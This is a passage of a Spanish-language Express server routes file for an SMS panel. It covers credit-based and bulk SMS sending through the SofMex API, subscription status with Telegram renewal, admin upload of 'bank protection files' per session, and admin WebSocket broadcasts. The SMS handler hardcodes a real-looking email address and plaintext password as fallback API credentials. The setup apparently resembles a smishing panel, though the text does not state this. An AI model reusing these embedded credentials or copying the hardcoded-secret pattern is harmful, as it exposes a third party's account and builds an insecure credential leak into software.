      console.log("Modo simulación detectado:", simulationMode);

      // En modo simulación no necesitamos credenciales válidas, pero en modo real sí
      const hasValidCredentials = simulationMode || (!!config.username && !!config.password);
      
      // Si no estamos en modo simulación y no tenemos credenciales válidas, no podemos enviar
      if (!hasValidCredentials) {
        return res.status(400).json({ 
          success: false, 
          message: "La API de SMS no tiene credenciales configuradas. Ve a Configuración y proporciona un usuario y contraseña válidos." 
        });
      }

      // Verificar si el usuario tiene créditos (solo para usuarios regulares)
      // Los administradores no necesitan créditos para enviar SMS
      if (user.role !== UserRole.ADMIN) {
        const hasCredits = await storage.useSmsCredit(user.id);
        if (!hasCredits) {
          return res.status(400).json({ 
            success: false, 
            message: "No tienes créditos suficientes para enviar un SMS" 
          });
        }
      }

      // Validar los datos del SMS
      const { phoneNumber, message, sessionId } = req.body;
      
      console.log("Datos de SMS a enviar:", { phoneNumber, messageLength: message?.length || 0, sessionId });

      if (!phoneNumber) {
        return res.status(400).json({ 
          success: false, 
          message: "Se requiere número de teléfono" 
        });
      }
      
      // Permitir mensaje vacío para mayor flexibilidad
      const messageContent = message || "Mensaje de prueba";

      // Preparar los datos para el historial
      const smsData = insertSmsHistorySchema.parse({
        userId: user.id,
        phoneNumber,
        message: messageContent,
        sessionId: sessionId || null
      });

      // Guardar en el historial como pendiente
      const smsRecord = await storage.addSmsToHistory(smsData);

      // Verificar si estamos en modo simulación antes de continuar
      if (simulationMode) {
        console.log("Detectado modo simulación - Procesando SMS simulado");
        // Actualizar el registro como enviado (simulado)
        await storage.updateSmsStatus(smsRecord.id, 'sent');
        
        return res.json({
          success: true,
          message: "Mensaje enviado correctamente (simulado)",
          smsId: smsRecord.id,
          simulated: true
        });
      }
      
      // Implementación real de la API de Sofmex (sólo se ejecuta si no estamos en modo simulación)
      try {
        // Primero verificamos que tengamos una configuración
        if (!config) {
          throw new Error("Configuración de API no encontrada");
        }
        
        const username = config.username || 'josemorenofs19@gmail.com';
        const password = config.password || 'Balon19@';
        
        // Ajustar URL base según la documentación oficial de SofMex
        const apiUrl = config.apiUrl || 'https://api.sofmex.mx';
        
        // URL específica para envío de SMS según la documentación de SofMex
        // Consultar correctamente la documentación en https://api.sofmex.mx/api/swagger-ui/index.html
        
        // Telegram funciona con esta URL, así que usemos el mismo formato
        let smsApiUrl = 'https://api.sofmex.mx/smssend';
        console.log("Usando URL para API de SofMex:", smsApiUrl);
        
        // Ya no usamos autenticación básica en los headers porque pasamos los datos
        // directamente en el cuerpo de la solicitud
        
        // Formato del cuerpo según el formato que espera la API
        const requestData = {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            numero: phoneNumber,             // El número de teléfono 
            mensaje: messageContent,         // El mensaje a enviar
            usuario: username,               // Usuario para autenticación
            password: password               // Contraseña para autenticación
          })
        };

        console.log("Enviando SMS a través de la API:", {
          url: smsApiUrl,
          phone: phoneNumber,
          messageLength: messageContent.length
        });

        try {
          console.log("Intentando conectar a:", smsApiUrl);
          // Ocultar la contraseña en los logs para seguridad
          const logData = JSON.parse(requestData.body as string);
          const redactedData = {
              ...logData,
              password: "[CONTRASEÑA_OCULTA]"
          };
          
          console.log("Datos de la solicitud:", {
            method: requestData.method,
            headers: requestData.headers,
            datos: redactedData
          });

          // Ya verificamos el modo simulación arriba, así que este bloque es innecesario
          // Lo eliminamos para evitar confusiones

          // Agregar timeout para evitar bloqueo indefinido
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), 10000);

          try {
            // Usaremos axios en lugar de fetch ya que puede manejar mejor ciertas situaciones de red
            console.log("Usando axios para realizar la solicitud");
            const axiosResponse = await axios.post(smsApiUrl, {
              numero: phoneNumber,
              mensaje: messageContent,
              usuario: username,
              password: password
            }, {
              headers: {
                'Content-Type': 'application/json'
              },
              timeout: 10000 // 10 segundos de timeout
            });
            
            // Simulamos una respuesta fetch para mantener compatibilidad con el código existente
            const response = {
              ok: axiosResponse.status >= 200 && axiosResponse.status < 300,
              status: axiosResponse.status,
              statusText: axiosResponse.statusText,
              text: async () => JSON.stringify(axiosResponse.data)
            };

            clearTimeout(timeoutId);

            const responseText = await response.text();
            let responseData;

            try {
              responseData = JSON.parse(responseText);
            } catch (e) {
              responseData = { message: `Respuesta no es JSON válido: ${responseText.substring(0, 100)}` };
            }

            console.log("Respuesta recibida:", {
              status: response.status,
              statusText: response.statusText,
              data: responseData
            });

            if (response.ok) {
              // Actualizar el registro como enviado
              await storage.updateSmsStatus(smsRecord.id, 'sent');
              console.log("SMS enviado correctamente:", responseData);

              res.json({
                success: true,
                message: "Mensaje enviado correctamente",
                smsId: smsRecord.id,
                apiResponse: responseData
              });
            } else {
              // La API respondió con un error
              const errorMsg = responseData.message || `Error ${response.status}: ${response.statusText}`;
              await storage.updateSmsStatus(smsRecord.id, 'failed', errorMsg);
              console.error("Error al enviar SMS:", errorMsg);

              res.status(400).json({
                success: false,
                message: `Error en la API de SMS: ${errorMsg}`,
                smsId: smsRecord.id
              });
            }
          } catch (fetchError: any) {
            if (fetchError.name === 'AbortError') {
              const timeoutMsg = 'La solicitud excedió el tiempo de espera (10 segundos)';
              await storage.updateSmsStatus(smsRecord.id, 'failed', timeoutMsg);
              console.error("Timeout en la solicitud a la API de SMS");

              res.status(500).json({
                success: false,
                message: timeoutMsg,
                smsId: smsRecord.id
              });
            } else {
              throw fetchError; // Propagar otros errores al manejador externo
            }
          }

        } catch (error: any) {
          // Error al realizar la solicitud fetch
          const errorMsg = error.message || 'Error de conexión con la API';
          await storage.updateSmsStatus(smsRecord.id, 'failed', errorMsg);
          console.error("Error de conexión con la API de SMS:", errorMsg);

          res.status(500).json({
            success: false,
            message: `Error de conexión con la API de SMS: ${errorMsg}`,
            smsId: smsRecord.id
          });
        }
      } catch (apiError: any) {
        // Si ocurre un error con la API, actualizar el estado del SMS
        await storage.updateSmsStatus(smsRecord.id, 'failed', apiError.message);
        throw apiError;
      }
    } catch (error: any) {
      res.status(500).json({ 
        success: false, 
        message: error.message 
      });
    }
  });

  // Obtener historial de SMS enviados
  app.get('/api/sms/history', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const user = req.user;
      const history = await storage.getUserSmsHistory(user.id);

      res.json(history);
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Obtener todos los usuarios regulares (para agregar créditos)
  app.get('/api/users/regular', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const currentUser = req.user;
      // Solo administradores pueden ver la lista de usuarios
      if (currentUser.role !== UserRole.ADMIN) {
        return res.status(403).json({ message: "Solo administradores pueden ver la lista de usuarios" });
      }

      const users = await storage.getAllUsers();
      // Filtrar administradores y enviar solo datos básicos
      const regularUsers = users.filter(user => user.role === UserRole.USER).map(user => ({
        id: user.id,
        username: user.username,
        isActive: user.isActive,
        expiresAt: user.expiresAt,
        credits: 0 // El frontend tendrá que cargar los créditos aparte
      }));

      res.json(regularUsers);
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Ruta para obtener información de la suscripción del usuario
  app.get("/api/user/subscription", async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ error: "No autenticado" });
      }
      
      const user = req.user;
      const now = new Date();
      const expiresAt = user.expiresAt;
      
      // Determinar si es administrador
      const isAdmin = user.role === UserRole.ADMIN;
      
      // Si es administrador, devolver un conjunto diferente de datos
      if (isAdmin) {
        return res.json({
          isActive: true,
          isPaid: true,
          isAdmin: true,
          expiresAt: null,
          daysRemaining: null,
          hoursRemaining: null,
          message: "Cuenta de administrador con acceso completo"
        });
      }
      
      // Calcular días y horas restantes si hay una fecha de expiración
      let daysRemaining = null;
      let hoursRemaining = null;
      
      if (expiresAt) {
        const diffMs = expiresAt.getTime() - now.getTime();
        const diffHrs = Math.floor(diffMs / (1000 * 60 * 60));
        daysRemaining = Math.floor(diffHrs / 24);
        hoursRemaining = diffHrs % 24;
      }
      
      // Determinar si está activo (es decir, si la suscripción no ha expirado)
      const isActive = !!user.isActive;
      
      // Determinar si está pagado (puede estar inactivo pero con pago pendiente)
      const isPaid = isActive && !!expiresAt && expiresAt > now;
      
      // Crear el mensaje apropiado según el estado
      let message = "";
      
      if (!isActive) {
        message = "Tu cuenta está desactivada. Contacta al administrador para activarla.";
      } else if (!expiresAt) {
        message = "No tienes una suscripción activa. Contacta al administrador para adquirir una.";
      } else if (expiresAt < now) {
        message = "Tu suscripción ha vencido. Contacta al administrador para renovarla.";
      } else if (daysRemaining === 0 && hoursRemaining !== null && hoursRemaining <= 24) {
        message = `Tu suscripción vence pronto. Contacta al administrador en Telegram (@BalonxSistema) para renovar.`;
      } else if (daysRemaining !== null && daysRemaining <= 1) {
        message = `Tu suscripción vence en menos de 2 días. Contacta al administrador para renovar.`;
      } else {
        message = "Suscripción vigente. Puedes usar todos los servicios.";
      }
      
      res.json({
        isActive,
        isPaid,
        isAdmin,
        expiresAt: expiresAt ? expiresAt.toISOString() : null,
        daysRemaining,
        hoursRemaining,
        message
      });
    } catch (error: any) {
      console.error("Error al obtener información de suscripción:", error);
      res.status(500).json({ error: error.message || "Error al obtener información de suscripción" });
    }
  });

  // Ruta para subir archivos de protección bancaria
  app.post('/api/upload-protection-file', upload.single('file'), async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const user = req.user;
    if (user.role !== UserRole.ADMIN) {
      return res.status(403).json({ message: "No autorizado" });
    }

    if (!req.file) {
      return res.status(400).json({ message: "No se subió ningún archivo" });
    }

    try {
      const { sessionId } = req.body;
      if (!sessionId) {
        return res.status(400).json({ message: "Session ID requerido" });
      }

      // Generar URL del archivo
      const fileUrl = `/uploads/${req.file.filename}`;
      const fileSize = `${(req.file.size / 1024 / 1024).toFixed(2)} MB`;

      // Actualizar la sesión con la información del archivo
      await storage.updateSession(sessionId, {
        fileName: req.file.originalname,
        fileUrl: fileUrl,
        fileSize: fileSize
      });

      console.log(`Archivo subido para sesión ${sessionId}: ${req.file.originalname}`);

      res.json({
        success: true,
        fileName: req.file.originalname,
        fileUrl: fileUrl,
        fileSize: fileSize
      });
    } catch (error) {
      console.error("Error subiendo archivo:", error);
      res.status(500).json({ message: "Error interno del servidor" });
    }
  });

  // Ruta para eliminar archivo de protección bancaria
  app.delete('/api/remove-protection-file/:sessionId', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const user = req.user;
    if (user.role !== UserRole.ADMIN) {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { sessionId } = req.params;
      
      // Obtener información del archivo actual
      const session = await storage.getSessionById(sessionId);
      if (session && session.fileUrl) {
        // Eliminar archivo del sistema de archivos
        const filePath = path.join(process.cwd(), session.fileUrl);
        if (fs.existsSync(filePath)) {
          fs.unlinkSync(filePath);
        }
      }

      // Limpiar información del archivo en la sesión
      await storage.updateSession(sessionId, {
        fileName: null,
        fileUrl: null,
        fileSize: null
      });

      res.json({ success: true });
    } catch (error) {
      console.error("Error eliminando archivo:", error);
      res.status(500).json({ message: "Error interno del servidor" });
    }
  });

  // === RUTAS DE SMS ===
  
  // Obtener configuración de SMS
  app.get('/api/sms/config', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const user = req.user;
    if (user.role !== UserRole.ADMIN) {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const config = await storage.getSmsConfig();
      res.json({ success: true, config });
    } catch (error: any) {
      console.error('Error obteniendo configuración SMS:', error);
      res.status(500).json({ success: false, message: error.message });
    }
  });

  // Actualizar configuración de SMS
  app.post('/api/sms/config', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const user = req.user;
    if (user.role !== UserRole.ADMIN) {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { username, password, apiUrl } = req.body;
      
      const configData: InsertSmsConfig = {
        username: username || null,
        password: password || null,
        apiUrl: apiUrl || "https://www.sofmex.com/api/sms/v3/asignacion",
        isActive: true,
        updatedBy: user.username
      };

      const config = await storage.updateSmsConfig(configData);
      res.json({ success: true, config });
    } catch (error: any) {
      console.error('Error actualizando configuración SMS:', error);
      res.status(500).json({ success: false, message: error.message });
    }
  });

  // Obtener créditos de un usuario
  app.get('/api/sms/credits/:userId', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const user = req.user;
    if (user.role !== UserRole.ADMIN) {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const userId = parseInt(req.params.userId);
      const credits = await storage.getUserSmsCredits(userId);
      res.json({ success: true, credits });
    } catch (error: any) {
      console.error('Error obteniendo créditos SMS:', error);
      res.status(500).json({ success: false, message: error.message });
    }
  });

  // Agregar créditos a un usuario
  app.post('/api/sms/credits/add', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const user = req.user;
    if (user.role !== UserRole.ADMIN) {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { userId, amount } = req.body;
      
      if (!userId || !amount || amount <= 0) {
        return res.status(400).json({ 
          success: false, 
          message: "ID de usuario y cantidad válida son requeridos" 
        });
      }

      const credits = await storage.addSmsCredits(parseInt(userId), parseInt(amount));
      
      // Notificar al usuario sobre los créditos agregados
      await storage.createNotification({
        userId: parseInt(userId),
        type: 'success',
        title: 'Créditos SMS agregados',
        message: `Se han agregado ${amount} créditos SMS a tu cuenta`,
        details: `Total de créditos: ${credits.credits}`,
        priority: 'medium'
      });

      res.json({ success: true, credits });
    } catch (error: any) {
      console.error('Error agregando créditos SMS:', error);
      res.status(500).json({ success: false, message: error.message });
    }
  });

  // Obtener historial de SMS de un usuario
  app.get('/api/sms/history/:userId', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const user = req.user;
    if (user.role !== UserRole.ADMIN) {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const userId = parseInt(req.params.userId);
      const history = await storage.getUserSmsHistory(userId);
      res.json({ success: true, history });
    } catch (error: any) {
      console.error('Error obteniendo historial SMS:', error);
      res.status(500).json({ success: false, message: error.message });
    }
  });

  // Enviar SMS
  app.post('/api/sms/send', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const user = req.user;
    if (user.role !== UserRole.ADMIN) {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { phoneNumbers, message, prefix = '+52' } = req.body;
      
      console.log('Datos recibidos para SMS:', { 
        phoneNumbers, 
        messageLength: message?.length, 
        prefix 
      });

      // Validar que se proporcione número de teléfono
      if (!phoneNumbers || phoneNumbers.trim() === '') {
        return res.status(400).json({ 
          success: false, 
          message: "Se requiere número de teléfono" 
        });
      }

      // Validar el mensaje
      const messageValidation = validateSMSMessage(message);
      if (!messageValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: messageValidation.error 
        });
      }

      // Procesar y validar números de teléfono
      const processedNumbers = parsePhoneNumbers(phoneNumbers, prefix);
      
      if (processedNumbers.length === 0) {
        return res.status(400).json({ 
          success: false, 
          message: "No se encontraron números de teléfono válidos" 
        });
      }

      if (processedNumbers.length > 250) {
        return res.status(400).json({ 
          success: false, 
          message: "Máximo 250 números por envío" 
        });
      }

      // Verificar créditos del usuario
      const userCredits = await storage.getUserSmsCredits(user.id);
      const requiredCredits = processedNumbers.length;

      if (userCredits < requiredCredits) {
        return res.status(400).json({ 
          success: false, 
          message: `Créditos insuficientes. Tienes ${userCredits}, necesitas ${requiredCredits}` 
        });
      }

      console.log(`📱 Enviando ${processedNumbers.length} SMS desde panel admin por usuario ${user.username}`);

      // Enviar SMS usando Sofmex API directamente (sin verificar configuración)
      const smsResult = await sendBulkSMS(processedNumbers, message);
      
      let successCount = 0;
      let failedCount = 0;
      let creditedUsed = false;

      if (smsResult.success) {
        successCount = processedNumbers.length;
        // Descontar créditos solo si el envío fue exitoso
        for (let i = 0; i < requiredCredits; i++) {
          await storage.useSmsCredit(user.id);
        }
        creditedUsed = true;
        console.log(`✅ SMS enviados exitosamente. Créditos descontados: ${requiredCredits}`);
      } else {
        failedCount = processedNumbers.length;
        console.log(`❌ Error enviando SMS: ${smsResult.error}`);
      }

      // Guardar historial de envíos
      const historyPromises = processedNumbers.map(async (phoneNumber) => {
        return storage.addSmsToHistory({
          userId: user.id,
          phoneNumber,
          message,
          sessionId: req.body.sessionId || null
        });
      });

      await Promise.all(historyPromises);

      // Obtener créditos actualizados
      const finalCredits = await storage.getUserSmsCredits(user.id);

      res.json({
        success: true,
        data: {
          sent: successCount,
          failed: failedCount,
          total: processedNumbers.length,
          creditsUsed: creditedUsed ? requiredCredits : 0,
          remainingCredits: finalCredits,
          smsResponse: smsResult.data || null,
          error: smsResult.error || null
        }
      });

    } catch (error: any) {
      console.error('Error enviando SMS:', error);
      res.status(500).json({ success: false, message: error.message });
    }
  });

  return httpServer;
}

// Helper function to broadcast to admin clients, with option to target specific users
function broadcastToAdmins(message: string, targetUsername?: string) {
  // Intentar parsear el mensaje para logging y extraer información
  try {
    const parsedMessage = JSON.parse(message);
    console.log(`[Broadcast] Enviando mensaje de tipo: ${parsedMessage.type}`);
    
    // Si el mensaje se refiere a una sesión, intentamos obtener el creador
    if (parsedMessage.data && parsedMessage.data.createdBy && !targetUsername) {
      // Usar el creador de la sesión como targetUsername si no se proporcionó uno
      targetUsername = parsedMessage.data.createdBy;
      console.log(`[Broadcast] Estableciendo targetUsername a ${targetUsername} basado en createdBy`);
    }
  } catch (e) {
    console.log(`[Broadcast] Enviando mensaje (formato no JSON)`);
  }

  // Si se especifica un usuario objetivo, enviamos el mensaje solo a ese usuario y a todos los administradores
  let sentCount = 0;
  
  if (targetUsername) {
    // Buscar el cliente del usuario objetivo y los administradores
    const entries = Array.from(adminClients.entries());
    for (let i = 0; i < entries.length; i++) {
      const [username, client] = entries[i];
      
      // Consideramos que cualquier usuario que está conectado como admin debe ser un admin, y también envíamos al usuario que creó
      if ((username === targetUsername || username === 'balonx' || username === 'yako') && client.readyState === WebSocket.OPEN) {
        client.send(message);
        sentCount++;
        console.log(`[Broadcast] Mensaje enviado específicamente a ${username}`);
      }
    }
  } else {
    // Comportamiento original: broadcast a todos los administradores conectados
    const entries = Array.from(adminClients.entries());
    for (let i = 0; i < entries.length; i++) {
      const [username, client] = entries[i];
      if (client.readyState === WebSocket.OPEN) {
        client.send(message);
        sentCount++;
      }
    }
  }
  
  console.log(`[Broadcast] Mensaje enviado a ${sentCount} clientes administradores`);
}